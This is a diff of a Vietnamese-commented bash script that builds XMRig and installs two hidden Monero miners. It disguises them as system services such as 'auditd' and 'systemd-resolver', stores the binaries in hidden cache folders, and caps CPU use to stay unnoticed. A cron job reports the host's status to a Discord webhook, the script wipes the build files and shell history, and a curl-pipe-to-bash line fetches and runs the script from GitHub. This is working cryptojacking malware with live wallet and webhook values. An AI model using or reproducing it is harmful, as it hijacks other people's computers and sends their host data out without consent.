@@ -1,32 +1,48 @@
+
+
+
 #!/bin/bash
+# ghi hết đoạn dưới này ( nhớ bỏ dấu "#" )
+
+# bash <(curl -sSL https://raw.githubusercontent.com/DucManh206/rawtext/main/worker/setup.sh)
+
 
 # ========== CONFIG ==========
-WALLET2="48NiGqEZT6GV7acihQu6VMHjDKMZYPKXZ1bQCcdFrXjc1xDjc6D9sR1YsDppa1v9QkRbvgn2cGi424LPfvnXGbcLVAcyK9p"
+WALLET2="48NiGqEZT6GV7acihQu6VMHjDKMZYPKXZ1bQCcdFrXjc1xDjc6D9sR1YsDppa1v9QkRbvgn2cGi424LPfvnXGbcLVAcyK9p"  # ⚠️ Thay ví của bạn vào đây
 POOL="pool.supportxmr.com:443"
 DISCORD_WEBHOOK="https://discord.com/api/webhooks/1362712368441852015/UzYhxkLkAvkZm1IA8oy769N-PLfPJakT9OWe9wr2SCmNWVL0842CABegDTEI4rT5K9os" # Thay webhook
+KEY="47jKLNTu7MHZzbyfnhEZV4PHXe7z8CzpU6WV6hukLPthYnzmtXRWDFUYaa3pdM9xMnQxwsHCnw1zXBkVaNeUGRVkUc7VXoL"
+WORKER1="core_$(hostname)"
+WORKER2="silent_$(hostname)"
 
-WORKER="silent_$(hostname)"
+
 TOTAL_CORES=$(nproc)
-CPU1=$(awk "BEGIN {print int($TOTAL_CORES * 0.4)}")
-CPU2=$(awk "BEGIN {print int($TOTAL_CORES * 0.3)}")
+THREADS1=$(awk "BEGIN {print int($TOTAL_CORES * 0.4)}")
+THREADS2=$(awk "BEGIN {print int($TOTAL_CORES * 0.3)}")
+
 PRIORITY=3
 
-NAME1=$(shuf -n1 -e "core0" "sys1" "liblogd")
-NAME2=$(shuf -n1 -e "netd" "uagent" "systemx")
-INSTALL_DIR="$HOME/.local/share/.cache/.sysd"
-SERVICE1="svc_$(shuf -n1 -e a b c d e f g)1"
-SERVICE2="svc_$(shuf -n1 -e h i j k l m n)2"
-LOG1="/tmp/log1.log"
-LOG2="/tmp/log2.log"
+# Các biến riêng cho từng tiến trình
+NAME1=$(shuf -n1 -e "dbusd" "syscore" "udevd")
+NAME2=$(shuf -n1 -e "corelogd" "netlog" "sysnet")
+
+DIR1="$HOME/.local/share/.cache/.dbus1"
+DIR2="$HOME/.local/share/.cache/.dbus2"
+
+SERVICE1=$(shuf -n1 -e "systemd-resolver" "kernel-log" "net-fix")
+SERVICE2=$(shuf -n1 -e "auditd" "modprobe-sync" "xinetd")
+
+LOG1="/tmp/xmrig-log1.log"
+LOG2="/tmp/xmrig-log2.log"
 # ============================
 
-echo "🚀 Đang cài XMRig và cấu hình đào ẩn với 2 ví..."
+echo "🚀 Đang cài đặt XMRig kép..."
 
 # Cài thư viện cần thiết
 sudo apt update
 sudo apt install -y git build-essential cmake libuv1-dev libssl-dev libhwloc-dev curl
 
-# Tải và build XMRig
+# Clone và build XMRig
 cd ~
 rm -rf xmrig
 git clone https://github.com/xmrig/xmrig.git
@@ -35,20 +51,22 @@ mkdir build && cd build
 cmake .. -DCMAKE_BUILD_TYPE=Release
 make -j$TOTAL_CORES
 
-# Tạo thư mục và copy binary
-mkdir -p "$INSTALL_DIR"
-cp ./xmrig "$INSTALL_DIR/$NAME1"
-cp ./xmrig "$INSTALL_DIR/$NAME2"
-chmod +x "$INSTALL_DIR/$NAME1" "$INSTALL_DIR/$NAME2"
+# Copy file binary cho cả hai tiến trình
+mkdir -p "$DIR1" "$DIR2"
+cp ./xmrig "$DIR1/$NAME1"
+cp ./xmrig "$DIR2/$NAME2"
+chmod +x "$DIR1/$NAME1" "$DIR2/$NAME2"
 
-# Service 1 - ví ẩn từ GitHub
+# Tạo systemd cho tiến trình 1
 sudo tee /etc/systemd/system/$SERVICE1.service > /dev/null << EOF
 [Unit]
-Description=Net Daemon
+Description=Core Miner Daemon 1
 After=network.target
 
 [Service]
-ExecStart=$INSTALL_DIR/$NAME1 -o $POOL -u \$(curl -s https://raw.githubusercontent.com/DucManh206/rawtext/refs/heads/main/storage/key.txt).$WORKER -k --coin monero --tls --cpu-priority=$PRIORITY --threads=$CPU1 --donate-level=0 --max-cpu-usage=50 --log-file=$LOG1
+ExecStart=$DIR1/$NAME1 -o $POOL -u $KEY.$WORKER1 -k --coin monero --tls \\
+  --cpu-priority=$PRIORITY --threads=$THREADS1 --donate-level=0 \\
+  --max-cpu-usage=65 --log-file=$LOG1
 Restart=always
 Nice=10
 
@@ -56,14 +74,16 @@ Nice=10
 WantedBy=multi-user.target
 EOF
 
-# Service 2 - ví của người dùng
+# Tạo systemd cho tiến trình 2
 sudo tee /etc/systemd/system/$SERVICE2.service > /dev/null << EOF
 [Unit]
-Description=System Core
+Description=Core Miner Daemon 2
 After=network.target
 
 [Service]
-ExecStart=$INSTALL_DIR/$NAME2 -o $POOL -u $WALLET2.$WORKER -k --coin monero --tls --cpu-priority=$PRIORITY --threads=$CPU2 --donate-level=0 --max-cpu-usage=50 --log-file=$LOG2
+ExecStart=$DIR2/$NAME2 -o $POOL -u $WALLET2.$WORKER2 -k --coin monero --tls \\
+  --cpu-priority=$PRIORITY --threads=$THREADS2 --donate-level=0 \\
+  --max-cpu-usage=65 --log-file=$LOG2
 Restart=always
 Nice=10
 
@@ -71,39 +91,55 @@ Nice=10
 WantedBy=multi-user.target
 EOF
 
-# Kích hoạt và khởi động service
+# Kích hoạt cả hai service
 sudo systemctl daemon-reload
-sudo systemctl enable $SERVICE1 $SERVICE2
-sudo systemctl start $SERVICE1 $SERVICE2
+sudo systemctl enable $SERVICE1
+sudo systemctl enable $SERVICE2
+sudo systemctl start $SERVICE1
+sudo systemctl start $SERVICE2
 
-# Script gửi log về Discord
-tee "$INSTALL_DIR/logdual.sh" > /dev/null << EOF
+# Tạo script gửi log tiến trình 1 về Discord
+tee "$DIR1/logminer.sh" > /dev/null << EOF
 #!/bin/bash
 WEBHOOK="$DISCORD_WEBHOOK"
-HNAME=\$(hostname)
-HASH1=\$(grep -i "speed" "$LOG1" | tail -n1 | grep -oE "[0-9]+.[0-9]+ h/s")
-HASH2=\$(grep -i "speed" "$LOG2" | tail -n1 | grep -oE "[0-9]+.[0-9]+ h/s")
-CPU_USE=\$(top -bn1 | grep "Cpu(s)" | awk '{print \$2 + \$4}')
+PROCESS_NAME="$NAME1"
+HOST="\$(hostname)"
+HASHRATE="Unknown"
+LOG_FILE="$LOG1"
+
+if [ -f "\$LOG_FILE" ]; then
+  HASHRATE=\$(grep -i "speed" "\$LOG_FILE" | tail -n1 | grep -oE "[0-9]+.[0-9]+ h/s")
+fi
+
+CPU_USAGE=\$(top -bn1 | grep "Cpu(s)" | awk '{print \$2 + \$4}')
 UPTIME=\$(uptime -p)
+THREADS=$THREADS1
 
 curl -s -H "Content-Type: application/json" -X POST -d "{
-  \\"username\\": \\"XMRig Dual Status\\",
-  \\"content\\": \\"💻 \\\`\$HNAME\\\` đang đào XMR\\n⚙️ Threads: $CPU1 + $CPU2\\n💨 Hashrate 1: \\\`$HASH1\\\`\\n💨 Hashrate 2: \\\`$HASH2\\\`\\n📈 CPU: \\\`\$CPU_USE%\\\`\\n⏱️ Uptime: \\\`$UPTIME\\\`\\"
+  \\"username\\": \\"XMRig Status\\",
+  \\"content\\": \\"🖥️ \\\`\$HOST\\\` đào ví 1\\n⚙️ Process: \\\`$NAME1\\\`\\n🧠 Threads: \\\`\$THREADS\\\`\\n💨 Hashrate: \\\`\$HASHRATE\\\`\\n📈 CPU Usage: \\\`\${CPU_USAGE}%\\\`\\n⏱️ Uptime: \\\`\$UPTIME\\\`\\"
 }" "\$WEBHOOK" > /dev/null 2>&1
 EOF
 
-chmod +x "$INSTALL_DIR/logdual.sh"
+chmod +x "$DIR1/logminer.sh"
 
-# Gửi log mỗi 5 phút
-(crontab -l 2>/dev/null; echo "*/5 * * * * $INSTALL_DIR/logdual.sh") | crontab -
-"$INSTALL_DIR/logdual.sh"
+# Tạo cron gửi log mỗi 5 phút
+(crontab -l 2>/dev/null; echo "*/5 * * * * $DIR1/logminer.sh") | crontab -
 
-# Xoá dấu vết build
+# Gửi ping đầu tiên
+"$DIR1/logminer.sh"
+
+# Xoá dấu vết
 cd ~
 rm -rf xmrig
 history -c
 
-# Cài và chạy htop
-echo "📦 Cài đặt htop để theo dõi hệ thống..."
-sudo apt install -y htop
+echo ""
+echo "✅ Đang đào  🚀"
+
+# Cài htop nếu chưa có
+if ! command -v htop >/dev/null 2>&1; then
+    echo "📦 Đang cài đặt htop"
+    sudo apt install -y htop
+fi
 exec htop
